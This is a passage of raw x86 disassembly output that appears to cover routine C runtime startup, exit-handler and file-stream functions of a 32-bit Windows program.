  402c59:	59                   	pop    %ecx
  402c5a:	75 21                	jne    0x402c7d
  402c5c:	6a 04                	push   $0x4
  402c5e:	56                   	push   %esi
  402c5f:	89 35 00 d3 40 00    	mov    %esi,0x40d300
  402c65:	e8 0b 17 00 00       	call   0x404375
  402c6a:	59                   	pop    %ecx
  402c6b:	a3 f8 c2 40 00       	mov    %eax,0x40c2f8
  402c70:	85 c0                	test   %eax,%eax
  402c72:	59                   	pop    %ecx
  402c73:	75 08                	jne    0x402c7d
  402c75:	6a 1a                	push   $0x1a
  402c77:	e8 34 f6 ff ff       	call   0x4022b0
  402c7c:	59                   	pop    %ecx
  402c7d:	33 c9                	xor    %ecx,%ecx
  402c7f:	b8 80 92 40 00       	mov    $0x409280,%eax
  402c84:	8b 15 f8 c2 40 00    	mov    0x40c2f8,%edx
  402c8a:	89 04 11             	mov    %eax,(%ecx,%edx,1)
  402c8d:	83 c0 20             	add    $0x20,%eax
  402c90:	83 c1 04             	add    $0x4,%ecx
  402c93:	3d 00 95 40 00       	cmp    $0x409500,%eax
  402c98:	7c ea                	jl     0x402c84
  402c9a:	33 d2                	xor    %edx,%edx
  402c9c:	b9 90 92 40 00       	mov    $0x409290,%ecx
  402ca1:	8b c2                	mov    %edx,%eax
  402ca3:	8b f2                	mov    %edx,%esi
  402ca5:	c1 f8 05             	sar    $0x5,%eax
  402ca8:	83 e6 1f             	and    $0x1f,%esi
  402cab:	8b 04 85 e0 c1 40 00 	mov    0x40c1e0(,%eax,4),%eax
  402cb2:	8b 04 f0             	mov    (%eax,%esi,8),%eax
  402cb5:	83 f8 ff             	cmp    $0xffffffff,%eax
  402cb8:	74 04                	je     0x402cbe
  402cba:	85 c0                	test   %eax,%eax
  402cbc:	75 03                	jne    0x402cc1
  402cbe:	83 09 ff             	orl    $0xffffffff,(%ecx)
  402cc1:	83 c1 20             	add    $0x20,%ecx
  402cc4:	42                   	inc    %edx
  402cc5:	81 f9 f0 92 40 00    	cmp    $0x4092f0,%ecx
  402ccb:	7c d4                	jl     0x402ca1
  402ccd:	5e                   	pop    %esi
  402cce:	c3                   	ret
  402ccf:	e8 42 02 00 00       	call   0x402f16
  402cd4:	80 3d 24 be 40 00 00 	cmpb   $0x0,0x40be24
  402cdb:	74 05                	je     0x402ce2
  402cdd:	e9 44 17 00 00       	jmp    0x404426
  402ce2:	c3                   	ret
  402ce3:	a1 f4 c2 40 00       	mov    0x40c2f4,%eax
  402ce8:	85 c0                	test   %eax,%eax
  402cea:	74 02                	je     0x402cee
  402cec:	ff d0                	call   *%eax
  402cee:	68 14 90 40 00       	push   $0x409014
  402cf3:	68 08 90 40 00       	push   $0x409008
  402cf8:	e8 ce 00 00 00       	call   0x402dcb
  402cfd:	68 04 90 40 00       	push   $0x409004
  402d02:	68 00 90 40 00       	push   $0x409000
  402d07:	e8 bf 00 00 00       	call   0x402dcb
  402d0c:	83 c4 10             	add    $0x10,%esp
  402d0f:	c3                   	ret
  402d10:	6a 00                	push   $0x0
  402d12:	6a 00                	push   $0x0
  402d14:	ff 74 24 0c          	push   0xc(%esp)
  402d18:	e8 15 00 00 00       	call   0x402d32
  402d1d:	83 c4 0c             	add    $0xc,%esp
  402d20:	c3                   	ret
  402d21:	6a 00                	push   $0x0
  402d23:	6a 01                	push   $0x1
  402d25:	ff 74 24 0c          	push   0xc(%esp)
  402d29:	e8 04 00 00 00       	call   0x402d32
  402d2e:	83 c4 0c             	add    $0xc,%esp
  402d31:	c3                   	ret
  402d32:	57                   	push   %edi
  402d33:	6a 01                	push   $0x1
  402d35:	5f                   	pop    %edi
  402d36:	39 3d 2c be 40 00    	cmp    %edi,0x40be2c
  402d3c:	75 11                	jne    0x402d4f
  402d3e:	ff 74 24 08          	push   0x8(%esp)
  402d42:	ff 15 5c 80 40 00    	call   *0x40805c
  402d48:	50                   	push   %eax
  402d49:	ff 15 58 80 40 00    	call   *0x408058
  402d4f:	83 7c 24 0c 00       	cmpl   $0x0,0xc(%esp)
  402d54:	53                   	push   %ebx
  402d55:	8b 5c 24 14          	mov    0x14(%esp),%ebx
  402d59:	89 3d 28 be 40 00    	mov    %edi,0x40be28
  402d5f:	88 1d 24 be 40 00    	mov    %bl,0x40be24
  402d65:	75 3c                	jne    0x402da3
  402d67:	a1 f0 c2 40 00       	mov    0x40c2f0,%eax
  402d6c:	85 c0                	test   %eax,%eax
  402d6e:	74 22                	je     0x402d92
  402d70:	8b 0d ec c2 40 00    	mov    0x40c2ec,%ecx
  402d76:	56                   	push   %esi
  402d77:	8d 71 fc             	lea    -0x4(%ecx),%esi
  402d7a:	3b f0                	cmp    %eax,%esi
  402d7c:	72 13                	jb     0x402d91
  402d7e:	8b 06                	mov    (%esi),%eax
  402d80:	85 c0                	test   %eax,%eax
  402d82:	74 02                	je     0x402d86
  402d84:	ff d0                	call   *%eax
  402d86:	83 ee 04             	sub    $0x4,%esi
  402d89:	3b 35 f0 c2 40 00    	cmp    0x40c2f0,%esi
  402d8f:	73 ed                	jae    0x402d7e
  402d91:	5e                   	pop    %esi
  402d92:	68 20 90 40 00       	push   $0x409020
  402d97:	68 18 90 40 00       	push   $0x409018
  402d9c:	e8 2a 00 00 00       	call   0x402dcb
  402da1:	59                   	pop    %ecx
  402da2:	59                   	pop    %ecx
  402da3:	68 28 90 40 00       	push   $0x409028
  402da8:	68 24 90 40 00       	push   $0x409024
  402dad:	e8 19 00 00 00       	call   0x402dcb
  402db2:	59                   	pop    %ecx
  402db3:	59                   	pop    %ecx
  402db4:	85 db                	test   %ebx,%ebx
  402db6:	5b                   	pop    %ebx
  402db7:	75 10                	jne    0x402dc9
  402db9:	ff 74 24 08          	push   0x8(%esp)
  402dbd:	89 3d 2c be 40 00    	mov    %edi,0x40be2c
  402dc3:	ff 15 54 80 40 00    	call   *0x408054
  402dc9:	5f                   	pop    %edi
  402dca:	c3                   	ret
  402dcb:	56                   	push   %esi
  402dcc:	8b 74 24 08          	mov    0x8(%esp),%esi
  402dd0:	3b 74 24 0c          	cmp    0xc(%esp),%esi
  402dd4:	73 0d                	jae    0x402de3
  402dd6:	8b 06                	mov    (%esi),%eax
  402dd8:	85 c0                	test   %eax,%eax
  402dda:	74 02                	je     0x402dde
  402ddc:	ff d0                	call   *%eax
  402dde:	83 c6 04             	add    $0x4,%esi
  402de1:	eb ed                	jmp    0x402dd0
  402de3:	5e                   	pop    %esi
  402de4:	c3                   	ret
  402de5:	8b 44 24 04          	mov    0x4(%esp),%eax
  402de9:	53                   	push   %ebx
  402dea:	3b 05 e0 c2 40 00    	cmp    0x40c2e0,%eax
  402df0:	56                   	push   %esi
  402df1:	57                   	push   %edi
  402df2:	73 73                	jae    0x402e67
  402df4:	8b c8                	mov    %eax,%ecx
  402df6:	8b f0                	mov    %eax,%esi
  402df8:	c1 f9 05             	sar    $0x5,%ecx
  402dfb:	83 e6 1f             	and    $0x1f,%esi
  402dfe:	8d 3c 8d e0 c1 40 00 	lea    0x40c1e0(,%ecx,4),%edi
  402e05:	c1 e6 03             	shl    $0x3,%esi
  402e08:	8b 0f                	mov    (%edi),%ecx
  402e0a:	f6 44 31 04 01       	testb  $0x1,0x4(%ecx,%esi,1)
  402e0f:	74 56                	je     0x402e67
  402e11:	50                   	push   %eax
  402e12:	e8 54 18 00 00       	call   0x40466b
  402e17:	83 f8 ff             	cmp    $0xffffffff,%eax
  402e1a:	59                   	pop    %ecx
  402e1b:	75 0c                	jne    0x402e29
  402e1d:	c7 05 e4 bd 40 00 09 	movl   $0x9,0x40bde4
  402e24:	00 00 00 
  402e27:	eb 4f                	jmp    0x402e78
  402e29:	ff 74 24 18          	push   0x18(%esp)
  402e2d:	6a 00                	push   $0x0
  402e2f:	ff 74 24 1c          	push   0x1c(%esp)
  402e33:	50                   	push   %eax
  402e34:	ff 15 64 80 40 00    	call   *0x408064
  402e3a:	8b d8                	mov    %eax,%ebx
  402e3c:	83 fb ff             	cmp    $0xffffffff,%ebx
  402e3f:	75 08                	jne    0x402e49
  402e41:	ff 15 60 80 40 00    	call   *0x408060
  402e47:	eb 02                	jmp    0x402e4b
  402e49:	33 c0                	xor    %eax,%eax
  402e4b:	85 c0                	test   %eax,%eax
  402e4d:	74 09                	je     0x402e58
  402e4f:	50                   	push   %eax
  402e50:	e8 29 16 00 00       	call   0x40447e
  402e55:	59                   	pop    %ecx
  402e56:	eb 20                	jmp    0x402e78
  402e58:	8b 07                	mov    (%edi),%eax
  402e5a:	80 64 30 04 fd       	andb   $0xfd,0x4(%eax,%esi,1)
  402e5f:	8d 44 30 04          	lea    0x4(%eax,%esi,1),%eax
  402e63:	8b c3                	mov    %ebx,%eax
  402e65:	eb 14                	jmp    0x402e7b
  402e67:	83 25 e8 bd 40 00 00 	andl   $0x0,0x40bde8
  402e6e:	c7 05 e4 bd 40 00 09 	movl   $0x9,0x40bde4
  402e75:	00 00 00 
  402e78:	83 c8 ff             	or     $0xffffffff,%eax
  402e7b:	5f                   	pop    %edi
  402e7c:	5e                   	pop    %esi
  402e7d:	5b                   	pop    %ebx
  402e7e:	c3                   	ret
  402e7f:	56                   	push   %esi
  402e80:	8b 74 24 08          	mov    0x8(%esp),%esi
  402e84:	85 f6                	test   %esi,%esi
  402e86:	75 09                	jne    0x402e91
  402e88:	56                   	push   %esi
  402e89:	e8 91 00 00 00       	call   0x402f1f
  402e8e:	59                   	pop    %ecx
  402e8f:	5e                   	pop    %esi
  402e90:	c3                   	ret
  402e91:	56                   	push   %esi
  402e92:	e8 23 00 00 00       	call   0x402eba
  402e97:	85 c0                	test   %eax,%eax
  402e99:	59                   	pop    %ecx
  402e9a:	74 05                	je     0x402ea1
  402e9c:	83 c8 ff             	or     $0xffffffff,%eax
  402e9f:	5e                   	pop    %esi
  402ea0:	c3                   	ret
  402ea1:	f6 46 0d 40          	testb  $0x40,0xd(%esi)
  402ea5:	74 0f                	je     0x402eb6
  402ea7:	ff 76 10             	push   0x10(%esi)
  402eaa:	e8 f9 17 00 00       	call   0x4046a8
  402eaf:	f7 d8                	neg    %eax
  402eb1:	59                   	pop    %ecx
  402eb2:	5e                   	pop    %esi
  402eb3:	1b c0                	sbb    %eax,%eax
  402eb5:	c3                   	ret
  402eb6:	33 c0                	xor    %eax,%eax
  402eb8:	5e                   	pop    %esi
  402eb9:	c3                   	ret
  402eba:	53                   	push   %ebx
  402ebb:	56                   	push   %esi
  402ebc:	8b 74 24 0c          	mov    0xc(%esp),%esi
  402ec0:	33 db                	xor    %ebx,%ebx
  402ec2:	57                   	push   %edi
  402ec3:	8b 46 0c             	mov    0xc(%esi),%eax
  402ec6:	8b c8                	mov    %eax,%ecx
  402ec8:	83 e1 03             	and    $0x3,%ecx
  402ecb:	80 f9 02             	cmp    $0x2,%cl
  402ece:	75 37                	jne    0x402f07
  402ed0:	66 a9 08 01          	test   $0x108,%ax
  402ed4:	74 31                	je     0x402f07
  402ed6:	8b 46 08             	mov    0x8(%esi),%eax
  402ed9:	8b 3e                	mov    (%esi),%edi
  402edb:	2b f8                	sub    %eax,%edi
  402edd:	85 ff                	test   %edi,%edi
  402edf:	7e 26                	jle    0x402f07
  402ee1:	57                   	push   %edi
  402ee2:	50                   	push   %eax
  402ee3:	ff 76 10             	push   0x10(%esi)
  402ee6:	e8 14 18 00 00       	call   0x4046ff
  402eeb:	83 c4 0c             	add    $0xc,%esp
  402eee:	3b c7                	cmp    %edi,%eax
  402ef0:	75 0e                	jne    0x402f00
  402ef2:	8b 46 0c             	mov    0xc(%esi),%eax
  402ef5:	a8 80                	test   $0x80,%al
  402ef7:	74 0e                	je     0x402f07
  402ef9:	24 fd                	and    $0xfd,%al
  402efb:	89 46 0c             	mov    %eax,0xc(%esi)
  402efe:	eb 07                	jmp    0x402f07
  402f00:	83 4e 0c 20          	orl    $0x20,0xc(%esi)
  402f04:	83 cb ff             	or     $0xffffffff,%ebx
  402f07:	8b 46 08             	mov    0x8(%esi),%eax
  402f0a:	83 66 04 00          	andl   $0x0,0x4(%esi)
  402f0e:	89 06                	mov    %eax,(%esi)
  402f10:	5f                   	pop    %edi
  402f11:	8b c3                	mov    %ebx,%eax
  402f13:	5e                   	pop    %esi
  402f14:	5b                   	pop    %ebx
  402f15:	c3                   	ret
  402f16:	6a 01                	push   $0x1
  402f18:	e8 02 00 00 00       	call   0x402f1f
  402f1d:	59                   	pop    %ecx
  402f1e:	c3                   	ret
  402f1f:	53                   	push   %ebx
  402f20:	56                   	push   %esi
  402f21:	57                   	push   %edi
  402f22:	33 f6                	xor    %esi,%esi
  402f24:	33 db                	xor    %ebx,%ebx
  402f26:	33 ff                	xor    %edi,%edi
  402f28:	39 35 00 d3 40 00    	cmp    %esi,0x40d300
  402f2e:	7e 4d                	jle    0x402f7d
  402f30:	a1 f8 c2 40 00       	mov    0x40c2f8,%eax
  402f35:	8b 04 b0             	mov    (%eax,%esi,4),%eax
  402f38:	85 c0                	test   %eax,%eax
  402f3a:	74 38                	je     0x402f74
  402f3c:	8b 48 0c             	mov    0xc(%eax),%ecx
  402f3f:	f6 c1 83             	test   $0x83,%cl
  402f42:	74 30                	je     0x402f74
  402f44:	83 7c 24 10 01       	cmpl   $0x1,0x10(%esp)
  402f49:	75 0f                	jne    0x402f5a
  402f4b:	50                   	push   %eax
  402f4c:	e8 2e ff ff ff       	call   0x402e7f
  402f51:	83 f8 ff             	cmp    $0xffffffff,%eax
  402f54:	59                   	pop    %ecx
  402f55:	74 1d                	je     0x402f74
  402f57:	43                   	inc    %ebx
  402f58:	eb 1a                	jmp    0x402f74
  402f5a:	83 7c 24 10 00       	cmpl   $0x0,0x10(%esp)
  402f5f:	75 13                	jne    0x402f74
  402f61:	f6 c1 02             	test   $0x2,%cl
  402f64:	74 0e                	je     0x402f74
  402f66:	50                   	push   %eax
  402f67:	e8 13 ff ff ff       	call   0x402e7f
  402f6c:	83 f8 ff             	cmp    $0xffffffff,%eax
  402f6f:	59                   	pop    %ecx
  402f70:	75 02                	jne    0x402f74
  402f72:	0b f8                	or     %eax,%edi
  402f74:	46                   	inc    %esi
  402f75:	3b 35 00 d3 40 00    	cmp    0x40d300,%esi
  402f7b:	7c b3                	jl     0x402f30
  402f7d:	83 7c 24 10 01       	cmpl   $0x1,0x10(%esp)
  402f82:	8b c3                	mov    %ebx,%eax
  402f84:	74 02                	je     0x402f88
  402f86:	8b c7                	mov    %edi,%eax
  402f88:	5f                   	pop    %edi
  402f89:	5e                   	pop    %esi
  402f8a:	5b                   	pop    %ebx
  402f8b:	c3                   	ret
  402f8c:	83 ec 44             	sub    $0x44,%esp
  402f8f:	53                   	push   %ebx
  402f90:	55                   	push   %ebp
  402f91:	56                   	push   %esi
  402f92:	57                   	push   %edi
  402f93:	68 00 01 00 00       	push   $0x100
  402f98:	e8 23 11 00 00       	call   0x4040c0
  402f9d:	8b f0                	mov    %eax,%esi
  402f9f:	59                   	pop    %ecx
  402fa0:	85 f6                	test   %esi,%esi
  402fa2:	75 08                	jne    0x402fac
  402fa4:	6a 1b                	push   $0x1b
  402fa6:	e8 05 f3 ff ff       	call   0x4022b0
  402fab:	59                   	pop    %ecx
  402fac:	89 35 e0 c1 40 00    	mov    %esi,0x40c1e0
  402fb2:	c7 05 e0 c2 40 00 20 	movl   $0x20,0x40c2e0
  402fb9:	00 00 00 
  402fbc:	8d 86 00 01 00 00    	lea    0x100(%esi),%eax
  402fc2:	3b f0                	cmp    %eax,%esi
  402fc4:	73 1a                	jae    0x402fe0
  402fc6:	80 66 04 00          	andb   $0x0,0x4(%esi)
  402fca:	83 0e ff             	orl    $0xffffffff,(%esi)
  402fcd:	c6 46 05 0a          	movb   $0xa,0x5(%esi)
  402fd1:	a1 e0 c1 40 00       	mov    0x40c1e0,%eax
  402fd6:	83 c6 08             	add    $0x8,%esi
  402fd9:	05 00 01 00 00       	add    $0x100,%eax
  402fde:	eb e2                	jmp    0x402fc2
  402fe0:	8d 44 24 10          	lea    0x10(%esp),%eax
  402fe4:	50                   	push   %eax
  402fe5:	ff 15 48 80 40 00    	call   *0x408048
  402feb:	66 83 7c 24 42 00    	cmpw   $0x0,0x42(%esp)
  402ff1:	0f 84 c5 00 00 00    	je     0x4030bc
  402ff7:	8b 44 24 44          	mov    0x44(%esp),%eax
  402ffb:	85 c0                	test   %eax,%eax
  402ffd:	0f 84 b9 00 00 00    	je     0x4030bc
  403003:	8b 30                	mov    (%eax),%esi
  403005:	8d 68 04             	lea    0x4(%eax),%ebp
  403008:	b8 00 08 00 00       	mov    $0x800,%eax
  40300d:	3b f0                	cmp    %eax,%esi
  40300f:	8d 1c 2e             	lea    (%esi,%ebp,1),%ebx
  403012:	7c 02                	jl     0x403016
  403014:	8b f0                	mov    %eax,%esi
  403016:	39 35 e0 c2 40 00    	cmp    %esi,0x40c2e0
  40301c:	7d 52                	jge    0x403070
  40301e:	bf e4 c1 40 00       	mov    $0x40c1e4,%edi
  403023:	68 00 01 00 00       	push   $0x100
  403028:	e8 93 10 00 00       	call   0x4040c0
  40302d:	85 c0                	test   %eax,%eax
  40302f:	59                   	pop    %ecx
  403030:	74 38                	je     0x40306a
  403032:	83 05 e0 c2 40 00 20 	addl   $0x20,0x40c2e0
  403039:	89 07                	mov    %eax,(%edi)
  40303b:	8d 88 00 01 00 00    	lea    0x100(%eax),%ecx
  403041:	3b c1                	cmp    %ecx,%eax
  403043:	73 18                	jae    0x40305d
  403045:	80 60 04 00          	andb   $0x0,0x4(%eax)
  403049:	83 08 ff             	orl    $0xffffffff,(%eax)
  40304c:	c6 40 05 0a          	movb   $0xa,0x5(%eax)
  403050:	8b 0f                	mov    (%edi),%ecx
  403052:	83 c0 08             	add    $0x8,%eax
  403055:	81 c1 00 01 00 00    	add    $0x100,%ecx
  40305b:	eb e4                	jmp    0x403041
  40305d:	83 c7 04             	add    $0x4,%edi
  403060:	39 35 e0 c2 40 00    	cmp    %esi,0x40c2e0
  403066:	7c bb                	jl     0x403023
  403068:	eb 06                	jmp    0x403070
  40306a:	8b 35 e0 c2 40 00    	mov    0x40c2e0,%esi
  403070:	33 ff                	xor    %edi,%edi
  403072:	85 f6                	test   %esi,%esi
  403074:	7e 46                	jle    0x4030bc
  403076:	8b 03                	mov    (%ebx),%eax
  403078:	83 f8 ff             	cmp    $0xffffffff,%eax
  40307b:	74 36                	je     0x4030b3
  40307d:	8a 4d 00             	mov    0x0(%ebp),%cl
  403080:	f6 c1 01             	test   $0x1,%cl
  403083:	74 2e                	je     0x4030b3
  403085:	f6 c1 08             	test   $0x8,%cl
  403088:	75 0b                	jne    0x403095
  40308a:	50                   	push   %eax
  40308b:	ff 15 70 80 40 00    	call   *0x408070
  403091:	85 c0                	test   %eax,%eax
  403093:	74 1e                	je     0x4030b3
  403095:	8b c7                	mov    %edi,%eax
  403097:	8b cf                	mov    %edi,%ecx
  403099:	c1 f8 05             	sar    $0x5,%eax
  40309c:	83 e1 1f             	and    $0x1f,%ecx
  40309f:	8b 04 85 e0 c1 40 00 	mov    0x40c1e0(,%eax,4),%eax
  4030a6:	8d 04 c8             	lea    (%eax,%ecx,8),%eax
  4030a9:	8b 0b                	mov    (%ebx),%ecx
  4030ab:	89 08                	mov    %ecx,(%eax)
  4030ad:	8a 4d 00             	mov    0x0(%ebp),%cl
  4030b0:	88 48 04             	mov    %cl,0x4(%eax)
  4030b3:	47                   	inc    %edi
  4030b4:	45                   	inc    %ebp
  4030b5:	83 c3 04             	add    $0x4,%ebx
  4030b8:	3b fe                	cmp    %esi,%edi
  4030ba:	7c ba                	jl     0x403076
  4030bc:	33 db                	xor    %ebx,%ebx
  4030be:	a1 e0 c1 40 00       	mov    0x40c1e0,%eax
  4030c3:	83 3c d8 ff          	cmpl   $0xffffffff,(%eax,%ebx,8)
  4030c7:	8d 34 d8             	lea    (%eax,%ebx,8),%esi
  4030ca:	75 4d                	jne    0x403119
  4030cc:	85 db                	test   %ebx,%ebx
  4030ce:	c6 46 04 81          	movb   $0x81,0x4(%esi)
  4030d2:	75 05                	jne    0x4030d9
  4030d4:	6a f6                	push   $0xfffffff6
  4030d6:	58                   	pop    %eax
  4030d7:	eb 0a                	jmp    0x4030e3
  4030d9:	8b c3                	mov    %ebx,%eax
  4030db:	48                   	dec    %eax
  4030dc:	f7 d8                	neg    %eax
  4030de:	1b c0                	sbb    %eax,%eax
  4030e0:	83 c0 f5             	add    $0xfffffff5,%eax
  4030e3:	50                   	push   %eax
  4030e4:	ff 15 6c 80 40 00    	call   *0x40806c
  4030ea:	8b f8                	mov    %eax,%edi
  4030ec:	83 ff ff             	cmp    $0xffffffff,%edi
  4030ef:	74 17                	je     0x403108
  4030f1:	57                   	push   %edi
  4030f2:	ff 15 70 80 40 00    	call   *0x408070
  4030f8:	85 c0                	test   %eax,%eax
  4030fa:	74 0c                	je     0x403108
  4030fc:	25 ff 00 00 00       	and    $0xff,%eax
  403101:	89 3e                	mov    %edi,(%esi)
  403103:	83 f8 02             	cmp    $0x2,%eax
  403106:	75 06                	jne    0x40310e
  403108:	80 4e 04 40          	orb    $0x40,0x4(%esi)
  40310c:	eb 0f                	jmp    0x40311d
  40310e:	83 f8 03             	cmp    $0x3,%eax
  403111:	75 0a                	jne    0x40311d
  403113:	80 4e 04 08          	orb    $0x8,0x4(%esi)
  403117:	eb 04                	jmp    0x40311d
  403119:	80 4e 04 80          	orb    $0x80,0x4(%esi)
  40311d:	43                   	inc    %ebx
  40311e:	83 fb 03             	cmp    $0x3,%ebx
  403121:	7c 9b                	jl     0x4030be
  403123:	ff 35 e0 c2 40 00    	push   0x40c2e0
  403129:	ff 15 68 80 40 00    	call   *0x408068
  40312f:	5f                   	pop    %edi
  403130:	5e                   	pop    %esi
  403131:	5d                   	pop    %ebp
  403132:	5b                   	pop    %ebx
  403133:	83 c4 44             	add    $0x44,%esp
  403136:	c3                   	ret
  403137:	55                   	push   %ebp
  403138:	8b ec                	mov    %esp,%ebp
  40313a:	53                   	push   %ebx
  40313b:	56                   	push   %esi
  40313c:	8b 75 0c             	mov    0xc(%ebp),%esi
  40313f:	8b 46 0c             	mov    0xc(%esi),%eax
  403142:	8b 5e 10             	mov    0x10(%esi),%ebx
  403145:	a8 82                	test   $0x82,%al
  403147:	0f 84 f3 00 00 00    	je     0x403240
  40314d:	a8 40                	test   $0x40,%al
  40314f:	0f 85 eb 00 00 00    	jne    0x403240
  403155:	a8 01                	test   $0x1,%al
  403157:	74 16                	je     0x40316f
  403159:	83 66 04 00          	andl   $0x0,0x4(%esi)
  40315d:	a8 10                	test   $0x10,%al
  40315f:	0f 84 db 00 00 00    	je     0x403240
  403165:	8b 4e 08             	mov    0x8(%esi),%ecx
  403168:	24 fe                	and    $0xfe,%al
  40316a:	89 0e                	mov    %ecx,(%esi)
  40316c:	89 46 0c             	mov    %eax,0xc(%esi)
  40316f:	8b 46 0c             	mov    0xc(%esi),%eax
  403172:	83 66 04 00          	andl   $0x0,0x4(%esi)
  403176:	83 65 0c 00          	andl   $0x0,0xc(%ebp)
  40317a:	24 ef                	and    $0xef,%al
  40317c:	0c 02                	or     $0x2,%al
  40317e:	66 a9 0c 01          	test   $0x10c,%ax
  403182:	89 46 0c             	mov    %eax,0xc(%esi)
  403185:	75 22                	jne    0x4031a9
  403187:	81 fe a0 92 40 00    	cmp    $0x4092a0,%esi
  40318d:	74 08                	je     0x403197
  40318f:	81 fe c0 92 40 00    	cmp    $0x4092c0,%esi
  403195:	75 0b                	jne    0x4031a2
  403197:	53                   	push   %ebx
  403198:	e8 d5 0f 00 00       	call   0x404172
  40319d:	85 c0                	test   %eax,%eax
  40319f:	59                   	pop    %ecx
  4031a0:	75 07                	jne    0x4031a9
  4031a2:	56                   	push   %esi
  4031a3:	e8 04 17 00 00       	call   0x4048ac
  4031a8:	59                   	pop    %ecx
  4031a9:	66 f7 46 0c 08 01    	testw  $0x108,0xc(%esi)
  4031af:	57                   	push   %edi
  4031b0:	74 64                	je     0x403216
  4031b2:	8b 46 08             	mov    0x8(%esi),%eax
  4031b5:	8b 3e                	mov    (%esi),%edi
  4031b7:	2b f8                	sub    %eax,%edi
  4031b9:	8d 48 01             	lea    0x1(%eax),%ecx
  4031bc:	89 0e                	mov    %ecx,(%esi)
  4031be:	8b 4e 18             	mov    0x18(%esi),%ecx
  4031c1:	49                   	dec    %ecx
  4031c2:	85 ff                	test   %edi,%edi
  4031c4:	89 4e 04             	mov    %ecx,0x4(%esi)
  4031c7:	7e 10                	jle    0x4031d9
  4031c9:	57                   	push   %edi
  4031ca:	50                   	push   %eax
  4031cb:	53                   	push   %ebx
  4031cc:	e8 2e 15 00 00       	call   0x4046ff
  4031d1:	83 c4 0c             	add    $0xc,%esp
  4031d4:	89 45 0c             	mov    %eax,0xc(%ebp)
  4031d7:	eb 33                	jmp    0x40320c
  4031d9:	83 fb ff             	cmp    $0xffffffff,%ebx
  4031dc:	74 16                	je     0x4031f4
  4031de:	8b c3                	mov    %ebx,%eax
  4031e0:	8b cb                	mov    %ebx,%ecx
  4031e2:	c1 f8 05             	sar    $0x5,%eax
  4031e5:	83 e1 1f             	and    $0x1f,%ecx
  4031e8:	8b 04 85 e0 c1 40 00 	mov    0x40c1e0(,%eax,4),%eax
  4031ef:	8d 04 c8             	lea    (%eax,%ecx,8),%eax
  4031f2:	eb 05                	jmp    0x4031f9
  4031f4:	b8 00 95 40 00       	mov    $0x409500,%eax
  4031f9:	f6 40 04 20          	testb  $0x20,0x4(%eax)
  4031fd:	74 0d                	je     0x40320c
  4031ff:	6a 02                	push   $0x2
  403201:	6a 00                	push   $0x0
  403203:	53                   	push   %ebx
  403204:	e8 dc fb ff ff       	call   0x402de5
  403209:	83 c4 0c             	add    $0xc,%esp
  40320c:	8b 46 08             	mov    0x8(%esi),%eax
  40320f:	8a 4d 08             	mov    0x8(%ebp),%cl
  403212:	88 08                	mov    %cl,(%eax)
  403214:	eb 14                	jmp    0x40322a
  403216:	6a 01                	push   $0x1
  403218:	8d 45 08             	lea    0x8(%ebp),%eax
  40321b:	5f                   	pop    %edi
  40321c:	57                   	push   %edi
  40321d:	50                   	push   %eax
  40321e:	53                   	push   %ebx
  40321f:	e8 db 14 00 00       	call   0x4046ff
  403224:	83 c4 0c             	add    $0xc,%esp
  403227:	89 45 0c             	mov    %eax,0xc(%ebp)
  40322a:	39 7d 0c             	cmp    %edi,0xc(%ebp)
  40322d:	5f                   	pop    %edi
  40322e:	74 06                	je     0x403236
  403230:	83 4e 0c 20          	orl    $0x20,0xc(%esi)
  403234:	eb 0f                	jmp    0x403245
  403236:	8b 45 08             	mov    0x8(%ebp),%eax
  403239:	25 ff 00 00 00       	and    $0xff,%eax
  40323e:	eb 08                	jmp    0x403248
  403240:	0c 20                	or     $0x20,%al
  403242:	89 46 0c             	mov    %eax,0xc(%esi)
  403245:	83 c8 ff             	or     $0xffffffff,%eax
  403248:	5e                   	pop    %esi
  403249:	5b                   	pop    %ebx
  40324a:	5d                   	pop    %ebp
  40324b:	c3                   	ret
  40324c:	55                   	push   %ebp
  40324d:	8b ec                	mov    %esp,%ebp
  40324f:	51                   	push   %ecx
  403250:	56                   	push   %esi
  403251:	8b 75 08             	mov    0x8(%ebp),%esi
  403254:	85 f6                	test   %esi,%esi
  403256:	74 5a                	je     0x4032b2
  403258:	a1 c8 c1 40 00       	mov    0x40c1c8,%eax
  40325d:	83 f8 03             	cmp    $0x3,%eax
  403260:	75 16                	jne    0x403278
  403262:	56                   	push   %esi
  403263:	e8 d0 16 00 00       	call   0x404938
  403268:	59                   	pop    %ecx
  403269:	85 c0                	test   %eax,%eax
  40326b:	56                   	push   %esi
  40326c:	74 36                	je     0x4032a4
  40326e:	50                   	push   %eax
  40326f:	e8 ef 16 00 00       	call   0x404963
  403274:	59                   	pop    %ecx
  403275:	59                   	pop    %ecx
  403276:	eb 3a                	jmp    0x4032b2
  403278:	83 f8 02             	cmp    $0x2,%eax
  40327b:	75 26                	jne    0x4032a3
  40327d:	8d 45 08             	lea    0x8(%ebp),%eax
  403280:	50                   	push   %eax
  403281:	8d 45 fc             	lea    -0x4(%ebp),%eax
  403284:	50                   	push   %eax
  403285:	56                   	push   %esi
  403286:	e8 12 21 00 00       	call   0x40539d
  40328b:	83 c4 0c             	add    $0xc,%esp
  40328e:	85 c0                	test   %eax,%eax
  403290:	74 11                	je     0x4032a3
  403292:	50                   	push   %eax
  403293:	ff 75 08             	push   0x8(%ebp)
  403296:	ff 75 fc             	push   -0x4(%ebp)
  403299:	e8 56 21 00 00       	call   0x4053f4
  40329e:	83 c4 0c             	add    $0xc,%esp
  4032a1:	eb 0f                	jmp    0x4032b2
  4032a3:	56                   	push   %esi
  4032a4:	6a 00                	push   $0x0
  4032a6:	ff 35 c4 c1 40 00    	push   0x40c1c4
  4032ac:	ff 15 74 80 40 00    	call   *0x408074
  4032b2:	5e                   	pop    %esi
  4032b3:	c9                   	leave
  4032b4:	c3                   	ret
  4032b5:	53                   	push   %ebx
  4032b6:	55                   	push   %ebp
  4032b7:	56                   	push   %esi
  4032b8:	57                   	push   %edi
  4032b9:	8b 7c 24 14          	mov    0x14(%esp),%edi
  4032bd:	3b 3d e0 c2 40 00    	cmp    0x40c2e0,%edi
  4032c3:	0f 83 86 00 00 00    	jae    0x40334f
  4032c9:	8b c7                	mov    %edi,%eax
  4032cb:	8b f7                	mov    %edi,%esi
  4032cd:	c1 f8 05             	sar    $0x5,%eax
  4032d0:	83 e6 1f             	and    $0x1f,%esi
  4032d3:	8d 1c 85 e0 c1 40 00 	lea    0x40c1e0(,%eax,4),%ebx
  4032da:	c1 e6 03             	shl    $0x3,%esi
  4032dd:	8b 03                	mov    (%ebx),%eax
  4032df:	f6 44 30 04 01       	testb  $0x1,0x4(%eax,%esi,1)
  4032e4:	74 69                	je     0x40334f
